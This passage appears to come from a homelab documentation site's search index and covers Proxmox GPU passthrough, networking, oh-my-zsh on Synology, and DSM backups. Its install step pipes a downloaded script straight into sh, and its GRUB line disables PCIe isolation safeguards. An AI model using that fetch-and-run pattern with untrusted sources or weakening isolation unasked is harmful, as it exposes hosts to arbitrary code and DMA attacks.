2080 SUPER ] [ 10de:1e81 ] ( rev a1 ) ( prog-if 00 [ VGA controller ]) If you have multiple VGA, look for the one that has the Intel in the name. Here, the PCI address of the GPU is 01:00.0 . For best performance the VM should be configured the Machine type to q35 . This will allow the VM to utilize PCI-Express passthrough. Open the web gui and navigate to the Hardware tab of the VM you want to add a vGPU. Click Add above the device list and then choose PCI Device Open the Device dropdown and select the GPU, which you can find using it\u2019s PCI address. This list uses a different format for the PCI addresses id, 01:00.0 is listed as 0000:01:00.0 . Select All Functions , ROM-Bar , Primary GPU , PCI-Express and then click Add . The Windows Virtual Machine Proxmox Setting should look like this: Power on the Windows Virtual Machine. Connect to the VM via Remote Desktop (RDP) or any other remote access protocol you prefer. Install the latest version of GPU Driver for your GPU. If all when well you should see the following output in Device Manager and GPU-Z : That's it! Linux Virtual Machine GPU Passthrough Configuration \u00b6 We will be using Ubuntu Server 20.04 LTS. for this guide. From Proxmox Terminal find the PCI address of the GPU. lspci -nnv | grep VGA This should result in output similar to this: 01 :00.0 VGA compatible controller [ 0300 ] : NVIDIA Corporation TU104 [ GeForce RTX 2080 SUPER ] [ 10de:1e81 ] ( rev a1 ) ( prog-if 00 [ VGA controller ]) If you have multiple VGA, look for the one that has the Intel in the name. Here, the PCI address of the GPU is 01:00.0 . For best performance the VM should be configured the Machine type to q35 . This will allow the VM to utilize PCI-Express passthrough. Open the Device dropdown and select the GPU, which you can find using it\u2019s PCI address. This list uses a different format for the PCI addresses id, 01:00.0 is listed as 0000:01:00.0 . Select All Functions , ROM-Bar , PCI-Epress and then click Add . The Ubuntu Virtual Machine Proxmox Setting should look like this: Boot the VM. To test the GPU passthrough was successful, you can use the following command in the VM: sudo lspci -nnv | grep VGA The output should incliude the GPU: 01 :00.0 VGA compatible controller [ 0300 ] : NVIDIA Corporation TU104 [ GeForce RTX 2080 SUPER ] [ 10de:1e81 ] ( rev a1 ) ( prog-if 00 [ VGA controller ]) Now we need to install the GPU Driver. I'll be covering the installation of Nvidia Drivers in the next example. Search for the latest Nvidia Driver for your GPU. sudo apt search nvidia-driver In the next step we will install the Nvidia Driver v510. Note --no-install-recommends is important for Headless Server. nvidia-driver-510 will install xorg (GUI) --no-install-recommends flag will prevent the GUI from being installed. sudo apt install --no-install-recommends -y build-essential nvidia-driver-510 nvidia-headless-510 nvidia-utils-510 nvidia-cuda-toolkit This will take a while to install. After the installation is complete, you should reboot the VM. Now let's test the Driver initalization. Run the following command in the VM: nvidia-smi && nvidia-smi -L If all went well you should see the following output: That's it! You should now be able to use the GPU for hardware acceleration inside the VM. Debug \u00b6 Dbug Messages - Shows Hardware initialization and errors dmesg -w Display PCI devices information lspci Display Driver in use for PCI devices lspci -k Display IOMMU Groups the PCI devices are assigned to #!/bin/bash shopt -s nullglob for g in $( find /sys/kernel/iommu_groups/* -maxdepth 0 -type d | sort -V ) ; do echo \"IOMMU Group ${ g ##*/ } :\" for d in $g /devices/* ; do echo -e \"\\t $( lspci -nns ${ d ##*/ } ) \" done ; done ; Reboot Proxmox to apply the changes", "title": "GPU Passthrough to VM"}, {"location": "infrastructure/proxmox/gpu-passthrough/pgu-passthrough-to-vm/#proxmox-gpu-passthrough-to-vm", "text": "", "title": "Proxmox GPU Passthrough to VM"}, {"location": "infrastructure/proxmox/gpu-passthrough/pgu-passthrough-to-vm/#introduction", "text": "GPU passthrough is a technology that allows the Linux kernel to present the internal PCI GPU directly to the virtual machine. The device behaves as if it were powered directly by the virtual machine, and the virtual machine detects the PCI device as if it were physically connected. We will cover how to enable GPU passthrough to a virtual machine in Proxmox VE. Your mileage may vary depending on your hardware.", "title": "Introduction"}, {"location": "infrastructure/proxmox/gpu-passthrough/pgu-passthrough-to-vm/#proxmox-configuration-for-gpu-passthrough", "text": "The following examples uses SSH connection to the Proxmox server. The editor is nano but feel free to use any other editor. We will be editing the grub configuration file. Find the PCI address of the GPU Device. The following command will show the PCI address of the GPU devices in Proxmox server: lspci -nnv | grep VGA Find the GPU you want to passthrough in result ts should be similar to this: 01 :00.0 VGA compatible controller [ 0300 ] : NVIDIA Corporation TU104 [ GeForce RTX 2080 SUPER ] [ 10de:1e81 ] ( rev a1 ) ( prog-if 00 [ VGA controller ]) What we are looking is the PCI address of the GPU device. In this case it's 01:00.0 . 01:00.0 is only a part of of a group of PCI devices on the GPU. We can list all the devices in the group 01:00 by using the following command: lspci -s 01 :00 The usual output will include VGA Device and Audio Device. In my case, we have a USB Controller and a Serial bus controller: 01 :00.0 VGA compatible controller: NVIDIA Corporation TU104 [ GeForce RTX 2080 SUPER ] ( rev a1 ) 01 :00.1 Audio device: NVIDIA Corporation TU104 HD Audio Controller ( rev a1 ) 01 :00.2 USB controller: NVIDIA Corporation TU104 USB 3 .1 Host Controller ( rev a1 ) 01 :00.3 Serial bus controller [ 0c80 ] : NVIDIA Corporation TU104 USB Type-C UCSI Controller ( rev a1 ) Now we need to get the id's of those devices. We can do this by using the following command: lspci -s 01 :00 -n The output should look similar to this: 01 :00.0 0300 : 10de:1e81 ( rev a1 ) 01 :00.1 0403 : 10de:10f8 ( rev a1 ) 01 :00.2 0c03: 10de:1ad8 ( rev a1 ) 01 :00.3 0c80: 10de:1ad9 ( rev a1 ) What we are looking are the pairs, we will use those id to split the PCI Group to separate devices. 10de:1e81,10de:10f8,10de:1ad8,10de:1ad9 Now it's time to edit the grub configuration file. nano /etc/default/grub Find the line that starts with GRUB_CMDLINE_LINUX_DEFAULT by default they should look like this: GRUB_CMDLINE_LINUX_DEFAULT = \"quiet\" For Intel CPU For AMD CPU intel_iommu = on amd_iommu = on Then change it to look like this (Intel CPU example) and replace vfio-pci.ids= with the ids for the GPU you want to passthrough: GRUB_CMDLINE_LINUX_DEFAULT = \"quiet intel_iommu=on pcie_acs_override=downstream,multifunction video=efifb:off video=vesa:off vfio-pci.ids=10de:1e81,10de:10f8,10de:1ad8,10de:1ad9 vfio_iommu_type1.allow_unsafe_interrupts=1 kvm.ignore_msrs=1 modprobe.blacklist=radeon,nouveau,nvidia,nvidiafb,nvidia-gpu\" Save the config changed and then update GRUB. update-grub Next we need to add vfio modules to allow PCI passthrough. Edit the /etc/modules file. nano /etc/modules Add the following line to the end of the file: # Modules required for PCI passthrough vfio vfio_iommu_type1 vfio_pci vfio_virqfd Save and exit the editor. Update configuration changes made in your /etc filesystem update-initramfs -u -k all Reboot Proxmox to apply the changes Verify that IOMMU is enabled dmesg | grep -e DMAR -e IOMMU There should be a line that looks like DMAR: IOMMU enabled . If there is no output, something is wrong. [ 0 .000000 ] Warning: PCIe ACS overrides enabled ; This may allow non-IOMMU protected peer-to-peer DMA [ 0 .067203 ] DMAR: IOMMU enabled [ 2 .573920 ] pci 0000 :00:00.2: AMD-Vi: IOMMU performance counters supported [ 2 .580393 ] pci 0000 :00:00.2: AMD-Vi: Found IOMMU cap 0x40 [ 2 .581776 ] perf/amd_iommu: Detected AMD IOMMU #0 (2 banks, 4 counters/bank). Check that the GPU is in a separate IOMMU Group by using the following command: #!/bin/bash shopt -s nullglob for g in $( find /sys/kernel/iommu_groups/* -maxdepth 0 -type d | sort -V ) ; do echo \"IOMMU Group ${ g ##*/ } :\" for d in $g /devices/* ; do echo -e \"\\t $( lspci -nns ${ d ##*/ } ) \" done ; done ; Now your Proxmox host should be ready to GPU passthrough!", "title": "Proxmox Configuration for GPU Passthrough"}, {"location": "infrastructure/proxmox/gpu-passthrough/pgu-passthrough-to-vm/#windows-virtual-machine-gpu-passthrough-configuration", "text": "For better results its recommend to use this Windwos 10/11 Virutal Machine configuration for proxmox . Limitations & Workarounds In order for the GPU to to function properly in the VM, you must disable Proxmox's Virutal Display - Set it none . You will lose the ability to conect to the VM via Proxmox's Console. Display must be conected to the physical output of the GPU for the Windows Host to initialize the GPU properly. You can use a HDMI Dummy Plug as a workaround - It will present itself as a HDMI Display to the Windows Host. Make sure you have alternative way to connect to the VM for example via Remote Desktop (RDP). Find the PCI address of the GPU. lspci -nnv | grep VGA This should result in output similar to this: 01 :00.0 VGA compatible controller [ 0300 ] : NVIDIA Corporation TU104 [ GeForce RTX 2080 SUPER ] [ 10de:1e81 ] ( rev a1 ) ( prog-if 00 [ VGA controller ]) If you have multiple VGA, look for the one that has the Intel in the name. Here, the PCI address of the GPU is 01:00.0 . For best performance the VM should be configured the Machine type to q35 . This will allow the VM to utilize PCI-Express passthrough. Open the web gui and navigate to the Hardware tab of the VM you want to add a vGPU. Click Add above the device list and then choose PCI Device Open the Device dropdown and select the GPU, which you can find using it\u2019s PCI address. This list uses a different format for the PCI addresses id, 01:00.0 is listed as 0000:01:00.0 . Select All Functions , ROM-Bar , Primary GPU , PCI-Express and then click Add . The Windows Virtual Machine Proxmox Setting should look like this: Power on the Windows Virtual Machine. Connect to the VM via Remote Desktop (RDP) or any other remote access protocol you prefer. Install the latest version of GPU Driver for your GPU. If all when well you should see the following output in Device Manager and GPU-Z : That's it!", "title": "Windows Virtual Machine GPU Passthrough Configuration"}, {"location": "infrastructure/proxmox/gpu-passthrough/pgu-passthrough-to-vm/#linux-virtual-machine-gpu-passthrough-configuration", "text": "We will be using Ubuntu Server 20.04 LTS. for this guide. From Proxmox Terminal find the PCI address of the GPU. lspci -nnv | grep VGA This should result in output similar to this: 01 :00.0 VGA compatible controller [ 0300 ] : NVIDIA Corporation TU104 [ GeForce RTX 2080 SUPER ] [ 10de:1e81 ] ( rev a1 ) ( prog-if 00 [ VGA controller ]) If you have multiple VGA, look for the one that has the Intel in the name. Here, the PCI address of the GPU is 01:00.0 . For best performance the VM should be configured the Machine type to q35 . This will allow the VM to utilize PCI-Express passthrough. Open the Device dropdown and select the GPU, which you can find using it\u2019s PCI address. This list uses a different format for the PCI addresses id, 01:00.0 is listed as 0000:01:00.0 . Select All Functions , ROM-Bar , PCI-Epress and then click Add . The Ubuntu Virtual Machine Proxmox Setting should look like this: Boot the VM. To test the GPU passthrough was successful, you can use the following command in the VM: sudo lspci -nnv | grep VGA The output should incliude the GPU: 01 :00.0 VGA compatible controller [ 0300 ] : NVIDIA Corporation TU104 [ GeForce RTX 2080 SUPER ] [ 10de:1e81 ] ( rev a1 ) ( prog-if 00 [ VGA controller ]) Now we need to install the GPU Driver. I'll be covering the installation of Nvidia Drivers in the next example. Search for the latest Nvidia Driver for your GPU. sudo apt search nvidia-driver In the next step we will install the Nvidia Driver v510. Note --no-install-recommends is important for Headless Server. nvidia-driver-510 will install xorg (GUI) --no-install-recommends flag will prevent the GUI from being installed. sudo apt install --no-install-recommends -y build-essential nvidia-driver-510 nvidia-headless-510 nvidia-utils-510 nvidia-cuda-toolkit This will take a while to install. After the installation is complete, you should reboot the VM. Now let's test the Driver initalization. Run the following command in the VM: nvidia-smi && nvidia-smi -L If all went well you should see the following output: That's it! You should now be able to use the GPU for hardware acceleration inside the VM.", "title": "Linux Virtual Machine GPU Passthrough Configuration"}, {"location": "infrastructure/proxmox/gpu-passthrough/pgu-passthrough-to-vm/#debug", "text": "Dbug Messages - Shows Hardware initialization and errors dmesg -w Display PCI devices information lspci Display Driver in use for PCI devices lspci -k Display IOMMU Groups the PCI devices are assigned to #!/bin/bash shopt -s nullglob for g in $( find /sys/kernel/iommu_groups/* -maxdepth 0 -type d | sort -V ) ; do echo \"IOMMU Group ${ g ##*/ } :\" for d in $g /devices/* ; do echo -e \"\\t $( lspci -nns ${ d ##*/ } ) \" done ; done ; Reboot Proxmox to apply the changes", "title": "Debug"}, {"location": "infrastructure/proxmox/network/disable-ipv6/", "tags": ["proxmox", "ipv6"], "text": "Disable IPv6 on Proxmox Permanently \u00b6 By default, Proxmox IPv6 is enabled after installation. This means that the IPv6 stack is active and the host can communicate with other hosts on the same network via IPv6 protocol. Output of ip addr command: You can disable IPv6 on Proxmox VE by editing the /etc/default/grub file. nano /etc/default/grub add ipv6.disable=1 to the end of GRUB_CMDLINE_LINUX_DEFAULT and GRUB_CMDLINE_LINUX line. Don't change the other values at those lines. GRUB_CMDLINE_LINUX_DEFAULT = \"ipv6.disable=1\" GRUB_CMDLINE_LINUX = \"ipv6.disable=1\" The config should look like this: Update the grub configuration. update-grub Save and exit. Reboot Proxmox Server to apply the changes. Output of ip addr command after disabling IPv6 on Proxmox VE:", "title": "Disable IPv6 on Proxmox"}, {"location": "infrastructure/proxmox/network/disable-ipv6/#disable-ipv6-on-proxmox-permanently", "text": "By default, Proxmox IPv6 is enabled after installation. This means that the IPv6 stack is active and the host can communicate with other hosts on the same network via IPv6 protocol. Output of ip addr command: You can disable IPv6 on Proxmox VE by editing the /etc/default/grub file. nano /etc/default/grub add ipv6.disable=1 to the end of GRUB_CMDLINE_LINUX_DEFAULT and GRUB_CMDLINE_LINUX line. Don't change the other values at those lines. GRUB_CMDLINE_LINUX_DEFAULT = \"ipv6.disable=1\" GRUB_CMDLINE_LINUX = \"ipv6.disable=1\" The config should look like this: Update the grub configuration. update-grub Save and exit. Reboot Proxmox Server to apply the changes. Output of ip addr command after disabling IPv6 on Proxmox VE:", "title": "Disable IPv6 on Proxmox Permanently"}, {"location": "infrastructure/proxmox/network/proxmox-networking/", "tags": ["proxmox", "network"], "text": "Proxmox Networking \u00b6 Official Proxmox networking documentation can be found here . Basics \u00b6 Proxmox network configuration file location /etc/network/interfaces Restart proxmox network service to apply changes systemctl restart networking.service Example of Multi Network Interface Server \u00b6 The next examples will be based on the following network nics, ip addr output: 1 : lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00 :00:00:00:00:00 brd 00 :00:00:00:00:00 inet 127 .0.0.1/8 scope host lo valid_lft forever preferred_lft forever 2 : enp7s0: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000 link/ether 18 :c0:4d:00:9f:b7 brd ff:ff:ff:ff:ff:ff 3 : enp6s0: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000 link/ether 18 :c0:4d:00:9f:b9 brd ff:ff:ff:ff:ff:ff 4 : enp12s0f4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq master vmbr0 state UP group default qlen 1000 link/ether 00 :07:43:29:42:c0 brd ff:ff:ff:ff:ff:ff 5 : enp12s0f4d1: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000 link/ether 00 :07:43:29:42:c8 brd ff:ff:ff:ff:ff:ff 6 : enp12s0f4d2: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000 link/ether 00 :07:43:29:42:d0 brd ff:ff:ff:ff:ff:ff 7 : enp12s0f4d3: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000 link/ether 00 :07:43:29:42:d8 brd ff:ff:ff:ff:ff:ff 8 : wlp5s0: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000 link/ether 8c:c6:81:f0:a6:9a brd ff:ff:ff:ff:ff:ff 9 : vmbr0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000 link/ether 00 :07:43:29:42:c0 brd ff:ff:ff:ff:ff:ff inet 192 .168.100.12/24 scope global vmbr0 valid_lft forever preferred_lft forever In order Identify physical network interfaces corresponding to Network Interfaces name in Proxmox you can follow this guide Breakdown of the ip addr output: lo is a loopback interface. enp7s0 is a 2.5G network interface. enp6s0 is a 1G network interface. enp12s0f4 is a 10G network interface. enp12s0f4d1 is a 10G network interface. enp12s0f4d2 is a 10G network interface. enp12s0f4d3 is a 10G network interface. wlp5s0 is a Wifi network interface vmbr0 is a bridge interface. The content of the /etc/network/interfaces after fresh installation: auto lo iface lo inet loopback iface enp12s0f4 inet manual auto vmbr0 iface vmbr0 inet static address 192 .168.100.12/24 gateway 192 .168.100.1 bridge-ports enp12s0f4 bridge-stp off bridge-fd 0 iface enp7s0 inet manual iface enp6s0 inet manual iface enp12s0f4d1 inet manual iface enp12s0f4d2 inet manual iface enp12s0f4d3 inet manual iface wlp5s0 inet manual Info vmbr0 is a bridge interface. It's used to provision network to virtual machines and containers on Proxmox VE Server. We can assign multiple network interfaces to the bridge interface with bridge-ports option. Static IP Bridge Configuration \u00b6 The following example shows a static IP configuration vmbr0 bridge interface, including two network interfaces enp12s0f4 and enp7s0 . auto vmbr0 iface vmbr0 inet static address 192.168.100.12/24 gateway 192.168.100.1 bridge-ports enp12s0f4 enp7s0 bridge-stp off bridge-fd 0 Configuring multi network interfaces to the bridge interface will provide you a failover behavior when the network interface is down or disconnected - for example, when specific switch is down. Static IP Bridge with VLAN Aware Configuration \u00b6 The following example shows a static IP as above but with VLAN Aware bridge. auto vmbr0 iface vmbr0 inet static address 192.168.100.12/24 gateway 192.168.100.1 bridge-ports enp12s0f4 enp7s0 bridge-stp off bridge-fd 0 bridge-vlan-aware yes bridge-vids 2-4094 DHCP Bridge Configuration \u00b6 The following example shows a DHCP configuration vmbr0 bridge interface, including two network interfaces enp12s0f4 and enp7s0 . auto vmbr0 iface vmbr0 inet dhcp bridge-ports enp12s0f4 enp7s0 bridge-stp off bridge-fd 0 DHCP Bridge with VLAN Aware Configuration \u00b6 The following example shows a DHCP as above but with VLAN Aware bridge. auto vmbr0 iface vmbr0 inet dhcp bridge-ports enp12s0f4 enp7s0 bridge-stp off bridge-fd 0 bridge-vlan-aware yes bridge-vids 2-4094 Personal Network Configuration \u00b6 Here's a sample of the /etc/network/interfaces file for a personal network: auto lo iface lo inet loopback auto vmbr0 iface vmbr0 inet dhcp bridge-ports enp12s0f4 enp12s0f4d1 enp12s0f4d2 enp12s0f4d3 enp7s0 bridge-stp off bridge-fd 0 bridge-vlan-aware yes bridge-vids 2 -4094 iface enp12s0f4 inet manual iface enp12s0f4d1 inet manual iface enp12s0f4d2 inet manual iface enp12s0f4d3 inet manual iface enp7s0 inet manual iface enp6s0 inet manual iface wlp5s0 inet manual", "title": "Proxmox Networking"}, {"location": "infrastructure/proxmox/network/proxmox-networking/#proxmox-networking", "text": "Official Proxmox networking documentation can be found here .", "title": "Proxmox Networking"}, {"location": "infrastructure/proxmox/network/proxmox-networking/#basics", "text": "Proxmox network configuration file location /etc/network/interfaces Restart proxmox network service to apply changes systemctl restart networking.service", "title": "Basics"}, {"location": "infrastructure/proxmox/network/proxmox-networking/#example-of-multi-network-interface-server", "text": "The next examples will be based on the following network nics, ip addr output: 1 : lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00 :00:00:00:00:00 brd 00 :00:00:00:00:00 inet 127 .0.0.1/8 scope host lo valid_lft forever preferred_lft forever 2 : enp7s0: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000 link/ether 18 :c0:4d:00:9f:b7 brd ff:ff:ff:ff:ff:ff 3 : enp6s0: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000 link/ether 18 :c0:4d:00:9f:b9 brd ff:ff:ff:ff:ff:ff 4 : enp12s0f4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq master vmbr0 state UP group default qlen 1000 link/ether 00 :07:43:29:42:c0 brd ff:ff:ff:ff:ff:ff 5 : enp12s0f4d1: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000 link/ether 00 :07:43:29:42:c8 brd ff:ff:ff:ff:ff:ff 6 : enp12s0f4d2: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000 link/ether 00 :07:43:29:42:d0 brd ff:ff:ff:ff:ff:ff 7 : enp12s0f4d3: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000 link/ether 00 :07:43:29:42:d8 brd ff:ff:ff:ff:ff:ff 8 : wlp5s0: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000 link/ether 8c:c6:81:f0:a6:9a brd ff:ff:ff:ff:ff:ff 9 : vmbr0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000 link/ether 00 :07:43:29:42:c0 brd ff:ff:ff:ff:ff:ff inet 192 .168.100.12/24 scope global vmbr0 valid_lft forever preferred_lft forever In order Identify physical network interfaces corresponding to Network Interfaces name in Proxmox you can follow this guide Breakdown of the ip addr output: lo is a loopback interface. enp7s0 is a 2.5G network interface. enp6s0 is a 1G network interface. enp12s0f4 is a 10G network interface. enp12s0f4d1 is a 10G network interface. enp12s0f4d2 is a 10G network interface. enp12s0f4d3 is a 10G network interface. wlp5s0 is a Wifi network interface vmbr0 is a bridge interface. The content of the /etc/network/interfaces after fresh installation: auto lo iface lo inet loopback iface enp12s0f4 inet manual auto vmbr0 iface vmbr0 inet static address 192 .168.100.12/24 gateway 192 .168.100.1 bridge-ports enp12s0f4 bridge-stp off bridge-fd 0 iface enp7s0 inet manual iface enp6s0 inet manual iface enp12s0f4d1 inet manual iface enp12s0f4d2 inet manual iface enp12s0f4d3 inet manual iface wlp5s0 inet manual Info vmbr0 is a bridge interface. It's used to provision network to virtual machines and containers on Proxmox VE Server. We can assign multiple network interfaces to the bridge interface with bridge-ports option.", "title": "Example of Multi Network Interface Server"}, {"location": "infrastructure/proxmox/network/proxmox-networking/#static-ip-bridge-configuration", "text": "The following example shows a static IP configuration vmbr0 bridge interface, including two network interfaces enp12s0f4 and enp7s0 . auto vmbr0 iface vmbr0 inet static address 192.168.100.12/24 gateway 192.168.100.1 bridge-ports enp12s0f4 enp7s0 bridge-stp off bridge-fd 0 Configuring multi network interfaces to the bridge interface will provide you a failover behavior when the network interface is down or disconnected - for example, when specific switch is down.", "title": "Static IP Bridge Configuration"}, {"location": "infrastructure/proxmox/network/proxmox-networking/#static-ip-bridge-with-vlan-aware-configuration", "text": "The following example shows a static IP as above but with VLAN Aware bridge. auto vmbr0 iface vmbr0 inet static address 192.168.100.12/24 gateway 192.168.100.1 bridge-ports enp12s0f4 enp7s0 bridge-stp off bridge-fd 0 bridge-vlan-aware yes bridge-vids 2-4094", "title": "Static IP Bridge with VLAN Aware Configuration"}, {"location": "infrastructure/proxmox/network/proxmox-networking/#dhcp-bridge-configuration", "text": "The following example shows a DHCP configuration vmbr0 bridge interface, including two network interfaces enp12s0f4 and enp7s0 . auto vmbr0 iface vmbr0 inet dhcp bridge-ports enp12s0f4 enp7s0 bridge-stp off bridge-fd 0", "title": "DHCP Bridge Configuration"}, {"location": "infrastructure/proxmox/network/proxmox-networking/#dhcp-bridge-with-vlan-aware-configuration", "text": "The following example shows a DHCP as above but with VLAN Aware bridge. auto vmbr0 iface vmbr0 inet dhcp bridge-ports enp12s0f4 enp7s0 bridge-stp off bridge-fd 0 bridge-vlan-aware yes bridge-vids 2-4094", "title": "DHCP Bridge with VLAN Aware Configuration"}, {"location": "infrastructure/proxmox/network/proxmox-networking/#personal-network-configuration", "text": "Here's a sample of the /etc/network/interfaces file for a personal network: auto lo iface lo inet loopback auto vmbr0 iface vmbr0 inet dhcp bridge-ports enp12s0f4 enp12s0f4d1 enp12s0f4d2 enp12s0f4d3 enp7s0 bridge-stp off bridge-fd 0 bridge-vlan-aware yes bridge-vids 2 -4094 iface enp12s0f4 inet manual iface enp12s0f4d1 inet manual iface enp12s0f4d2 inet manual iface enp12s0f4d3 inet manual iface enp7s0 inet manual iface enp6s0 inet manual iface wlp5s0 inet manual", "title": "Personal Network Configuration"}, {"location": "infrastructure/synology/Install-oh-my-zsh/", "tags": ["template", "markdown"], "text": "How to install oh-my-zsh on Synology NAS \u00b6 Intoduction \u00b6 The following steps will instruct you how to install oh-my-zsh on Synology DSM NAS. Whats' ZSH \u00b6 Z-shell (Zsh) is a Unix shell that can be used as an interactive login shell and as a shell scripting command interpreter. Zsh is an enhanced Bourne shell with many enhancements, including some Bash, ksh and tcsh features. What's Oh-My-Zsh \u00b6 Oh My Zsh is an open source, community-driven framework for managing your zsh configuration. Community Packages for Synology DSM \u00b6 In order to install oh-my-zsh, we need to add 3 rd party packages to Synology DSM. Synology Community Packages provides packages for Synology-branded NAS devices. DSM 6 and below: Log into your NAS as administrator and go to Main Menu \u2192 Package Center \u2192 Settings and set Trust Level to Synology Inc. and trusted publishers. In the Package Sources tab, click Add, type SynoCommunity as Name and https://packages.synocommunity.com/ as Location and then press OK to validate. Go back to the Package Center and enjoy SynoCommunity's packages in the Community tab. Install Z shell (with modules) \u00b6 Install Z shell (with modules) from package center Community tab. Install Git \u00b6 Install Git from package center Community tab. Change The Default Shell to ZSH \u00b6 The following steps will be performed via SSH edit ~/.profile the file may be missing, so create it if it doesn't exist. vi ~/.profile Append the codes below to the end of the file or add if empty. if [[ -x /usr/local/bin/zsh ]] ; then export SHELL = /usr/local/bin/zsh exec /usr/local/bin/zsh fi Open new SSH session to Synology NAS the shell should be zsh Install Oh My Zsh \u00b6 From new SSH session with zsh shell, install Oh My Zsh with the one of following command: with curl: sh -c \" $( curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh ) \" with wget: sh -c \" $( wget -O- https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh ) \" At this point you should have a working oh-my-zsh working on your Synology NAS.", "title": "oh-my-zsh on Synology NAS"}, {"location": "infrastructure/synology/Install-oh-my-zsh/#how-to-install-oh-my-zsh-on-synology-nas", "text": "", "title": "How to install oh-my-zsh on Synology NAS"}, {"location": "infrastructure/synology/Install-oh-my-zsh/#intoduction", "text": "The following steps will instruct you how to install oh-my-zsh on Synology DSM NAS.", "title": "Intoduction"}, {"location": "infrastructure/synology/Install-oh-my-zsh/#whats-zsh", "text": "Z-shell (Zsh) is a Unix shell that can be used as an interactive login shell and as a shell scripting command interpreter. Zsh is an enhanced Bourne shell with many enhancements, including some Bash, ksh and tcsh features.", "title": "Whats' ZSH"}, {"location": "infrastructure/synology/Install-oh-my-zsh/#whats-oh-my-zsh", "text": "Oh My Zsh is an open source, community-driven framework for managing your zsh configuration.", "title": "What's Oh-My-Zsh"}, {"location": "infrastructure/synology/Install-oh-my-zsh/#community-packages-for-synology-dsm", "text": "In order to install oh-my-zsh, we need to add 3 rd party packages to Synology DSM. Synology Community Packages provides packages for Synology-branded NAS devices. DSM 6 and below: Log into your NAS as administrator and go to Main Menu \u2192 Package Center \u2192 Settings and set Trust Level to Synology Inc. and trusted publishers. In the Package Sources tab, click Add, type SynoCommunity as Name and https://packages.synocommunity.com/ as Location and then press OK to validate. Go back to the Package Center and enjoy SynoCommunity's packages in the Community tab.", "title": "Community Packages for Synology DSM"}, {"location": "infrastructure/synology/Install-oh-my-zsh/#install-z-shell-with-modules", "text": "Install Z shell (with modules) from package center Community tab.", "title": "Install Z shell (with modules)"}, {"location": "infrastructure/synology/Install-oh-my-zsh/#install-git", "text": "Install Git from package center Community tab.", "title": "Install Git"}, {"location": "infrastructure/synology/Install-oh-my-zsh/#change-the-default-shell-to-zsh", "text": "The following steps will be performed via SSH edit ~/.profile the file may be missing, so create it if it doesn't exist. vi ~/.profile Append the codes below to the end of the file or add if empty. if [[ -x /usr/local/bin/zsh ]] ; then export SHELL = /usr/local/bin/zsh exec /usr/local/bin/zsh fi Open new SSH session to Synology NAS the shell should be zsh", "title": "Change The Default Shell to ZSH"}, {"location": "infrastructure/synology/Install-oh-my-zsh/#install-oh-my-zsh", "text": "From new SSH session with zsh shell, install Oh My Zsh with the one of following command: with curl: sh -c \" $( curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh ) \" with wget: sh -c \" $( wget -O- https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh ) \" At this point you should have a working oh-my-zsh working on your Synology NAS.", "title": "Install Oh My Zsh"}, {"location": "infrastructure/synology/Installing-vm-tools-on-virtual-machine/", "text": "Installing VM Tools on Virtual Machine \u00b6 On Debian: sudo add-apt-repository universe sudo apt-get install qemu-guest-agent On CentOS 7: yum install -y qemu-guest-agent On CentOS 8: dnf install -y qemu-guest-agent", "title": "Installing VM Tools on Virtual Machine"}, {"location": "infrastructure/synology/Installing-vm-tools-on-virtual-machine/#installing-vm-tools-on-virtual-machine", "text": "On Debian: sudo add-apt-repository universe sudo apt-get install qemu-guest-agent On CentOS 7: yum install -y qemu-guest-agent On CentOS 8: dnf install -y qemu-guest-agent", "title": "Installing VM Tools on Virtual Machine"}, {"location": "infrastructure/synology/auto-dsm-config-backup/", "text": "Auto DSM Config Backup \u00b6 Since synology's dms doesn't provide any auto-backup for it's configuration i've made a smile script that can be run at from the \"Task Scheduler\". The script invokes synoconfbkp cli command that will dump the config file to provided folder. I use dropbox's folder in my case (This will sync my files to DropBox account). It append a date and hostname. It also checks the same folder for files older of 60 days and deletes them so your storage won't be flooded with files from older than 2 month. I've scheduled the script to run ounces a day with the \"Task Scheduler\" To use it create new Task Scheduler choose a scheduler append the script to \"Run Command\" at \"Task Settings\" don't forget to change to destinations. synoconfbkp export --filepath=/volume1/activeShare/Dropbox/SettingsConfigs/synologyConfigBackup/$(hostname)_$(date +%y%m%d).dss && find /volume1/activeShare/Dropbox/SettingsConfigs/synologyConfigBackup -type f -mtime +60 -exec rm -f {} \\;", "title": "Auto DSM Config Backup"}, {"location": "infrastructure/synology/auto-dsm-config-backup/#auto-dsm-config-backup", "text": "Since synology's dms doesn't provide any auto-backup for it's configuration i've made a smile script that can be run at from the \"Task Scheduler\". The script invokes synoconfbkp cli command that will dump the config file to provided folder. I use dropbox's folder in my case (This will sync my files to DropBox account). It append a date and hostname. It also checks the same folder for files older of 60 days and deletes them so your storage won't be flooded with files from older than 2 month. I've scheduled the script to run ounces a day with the \"Task Scheduler\" To use it create new Task Scheduler choose a scheduler append the script to \"Run Command\" at \"Task Settings\" 